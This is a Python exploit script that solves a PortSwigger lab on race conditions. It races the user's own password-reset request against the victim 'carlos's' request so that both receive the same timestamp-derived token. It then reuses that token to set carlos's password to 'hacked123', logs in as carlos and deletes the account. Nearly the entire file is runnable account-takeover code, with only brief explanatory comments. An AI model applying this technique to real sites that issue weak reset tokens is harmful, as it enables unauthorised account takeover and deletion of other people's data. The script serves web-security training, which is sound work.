# Lab 05 — Exploiting time-sensitive vulnerabilities
# PortSwigger: https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities
#
# Vulnerability: Password reset tokens are derived from a HIGH-RESOLUTION
#                TIMESTAMP instead of a cryptographically secure random
#                value — two requests processed within the same
#                timestamp "tick" receive the IDENTICAL token
# Aim:           Obtain a valid password reset token for carlos by racing
#                your own reset request against his, log in as carlos,
#                delete carlos
#
# Technique:
#   NOT a classic check-then-act race — the token GENERATION itself is
#   weak. Fire a password reset request for your own account and one for
#   carlos in the SAME parallel burst. If both land within the same
#   timestamp tick, your own (received) token also validates for carlos.
#
# Usage: python race_conditions_lab05.py <url> [own_username] [attempts]

import sys
import re
import urllib3
from proxies import proxies
from race_conditions_utils import (banner, section, make_session, login,
                                    get_csrf_from_response, send_parallel,
                                    warm_connection, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_USERNAME = "carlos"
NEW_PASSWORD = "hacked123"


def trigger_reset(session, url, username):
    """Trigger a password reset request for the given username."""
    fp_page = session.get(f"{url}/forgot-password")
    csrf = get_csrf_from_response(fp_page.text)
    data = {"username": username}
    if csrf:
        data["csrf"] = csrf
    return session.post(f"{url}/forgot-password", data=data)


def get_latest_token(session, url):
    """Fetch the email client and extract the most recent reset token."""
    email_page = session.get(f"{url}/email")
    matches = re.findall(r'temp-forgot-password-token=([a-zA-Z0-9]+)', email_page.text)
    return matches[0] if matches else None


if __name__ == "__main__":
    banner()
    section("LAB 05 — EXPLOITING TIME-SENSITIVE VULNERABILITIES")

    if len(sys.argv) < 2:
        print("  Usage: python race_conditions_lab05.py <url> [own_username] [attempts]")
        sys.exit(1)

    url = sys.argv[1]
    own_username = sys.argv[2] if len(sys.argv) > 2 else "wiener"
    attempts = int(sys.argv[3]) if len(sys.argv) > 3 else 10

    session = make_session(proxies)

    # ── Step 1: trigger a baseline reset for our own account, inspect token ─
    print(f"\n  ── Step 1: trigger a baseline reset for {own_username}\n")
    trigger_reset(session, url, own_username)
    baseline_token = get_latest_token(session, url)
    if baseline_token:
        print(f"  ✔  Baseline token: {baseline_token}")
        print(f"  ℹ  Token length: {len(baseline_token)} chars")
        print("  ℹ  Inspect this externally with a hash-identifying tool")
        print("     (e.g. `hashid <token>`) to confirm the likely algorithm")
        print("     (commonly SHA-1 of a timestamp for this lab).\n")
    else:
        print("  ✘  Could not extract a baseline token — check /email manually.\n")

    warm_connection(session, url)

    # ── Step 2: race repeatedly — fire both reset requests together ─────────
    print(f"  ── Step 2: race {own_username}'s and {TARGET_USERNAME}'s reset")
    print(f"             requests together, up to {attempts} attempts\n")

    found_shared_token = None

    for attempt in range(1, attempts + 1):
        race_session_own = make_session(proxies)
        race_session_target = make_session(proxies)

        def reset_own():
            return trigger_reset(race_session_own, url, own_username)

        def reset_target():
            return trigger_reset(race_session_target, url, TARGET_USERNAME)

        send_parallel([reset_own, reset_target])

        # Check the email client for our own freshly-generated token
        own_token = get_latest_token(session, url)

        if own_token:
            # Try this token against carlos's reset flow
            reset_page = session.get(f"{url}/forgot-password", params={"temp-forgot-password-token": own_token})
            reset_csrf = get_csrf_from_response(reset_page.text)

            reset_data = {
                "temp-forgot-password-token": own_token,
                "username": TARGET_USERNAME,
                "new-password-1": NEW_PASSWORD,
                "new-password-2": NEW_PASSWORD,
            }
            if reset_csrf:
                reset_data["csrf"] = reset_csrf

            r_try = session.post(f"{url}/forgot-password", data=reset_data)

            if r_try.status_code in (200, 302) and "incorrect" not in r_try.text.lower():
                found_shared_token = own_token
                print(f"  ✔  Attempt {attempt}: token {own_token} validated for {TARGET_USERNAME}!")
                break

        if attempt % 2 == 0:
            print(f"  ·  attempt {attempt}/{attempts} — no collision yet")

    if not found_shared_token:
        print(f"\n  ✘  No token collision found within {attempts} attempts.")
        print("     Timestamp-based collisions require the two requests to")
        print("     land within the SAME clock tick — this may need many")
        print("     more attempts, or Burp's single-packet attack for tighter")
        print("     synchronisation than pure-Python threading can achieve.")
        sys.exit(1)

    # ── Step 3: log in as carlos with the new password ────────────────────────
    print(f"\n  ── Step 3: log in as {TARGET_USERNAME} with the new password\n")
    admin_session = make_session(proxies)
    if login(admin_session, url, username=TARGET_USERNAME, password=NEW_PASSWORD):
        r_delete = admin_session.post(f"{url}/admin/delete", data={"username": TARGET_USERNAME})
        check_status(r_delete, [200, 302], f"Delete {TARGET_USERNAME}")
    else:
        print("  ✘  Login failed — inspect the reset flow manually.")

    print()
    print("  ℹ  This wasn't a classic check-then-act race — the token's")
    print("     WEAK, timestamp-derived randomness is the real vulnerability.")
    print("     Precise timing just gave us a way to trigger the collision.")
